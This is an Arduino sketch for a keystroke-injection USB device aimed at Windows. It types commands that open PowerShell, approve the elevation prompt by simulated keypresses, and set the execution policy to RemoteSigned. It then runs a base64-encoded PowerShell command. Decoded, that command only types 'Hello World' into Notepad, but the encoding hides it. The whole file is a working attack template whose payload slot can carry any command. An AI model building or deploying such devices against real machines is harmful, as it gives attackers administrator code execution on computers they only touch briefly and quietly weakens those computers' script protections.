#include "Keyboard.h"

void Command(const char* cmd) {
  Keyboard.println(cmd);
  delay(100);
}

void setup() {
  Keyboard.begin();
  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);

  Keyboard.println("powershell");
  delay(500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(1000);

  Command("Set-ExecutionPolicy RemoteSigned");
  delay(500);

  Keyboard.press('A');
  Keyboard.release('A');
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(500);

  Command("powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAbgBvAHQAZQBwAGEAZAAuAGUAeABlACIACgBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAE0AaQBsAGwAaQBzAGUAYwBvAG4AZABzACAANQAwADAACgBBAGQAZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAAoAWwBTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMALgBTAGUAbgBkAEsAZQB5AHMAXQA6ADoAUwBlAG4AZABXAGEAaQB0ACgAIgBIAGUAbABsAG8AIABXAG8AcgBsAGQAewBFAE4AVABFAFIAfQAiACkACgAKAA==");

  Keyboard.end();
}

void loop() {}
